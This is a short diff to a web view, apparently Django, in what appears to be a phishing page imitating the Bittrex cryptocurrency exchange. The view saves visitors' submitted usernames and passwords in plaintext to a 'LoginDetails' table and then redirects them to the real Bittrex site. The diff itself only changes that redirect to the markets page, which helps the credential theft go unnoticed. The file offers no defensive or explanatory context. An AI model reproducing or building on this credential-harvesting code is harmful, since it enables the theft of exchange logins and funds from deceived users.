@@ -12,7 +12,6 @@ def page(request):
         new_applicant = LoginDetails(username=UserName, password=Password)
 
         new_applicant.save()
-        success = 1
-        return redirect('https://bittrex.com')
+        return redirect('https://bittrex.com/home/markets')
     else:
         return render(request, 'index.html')
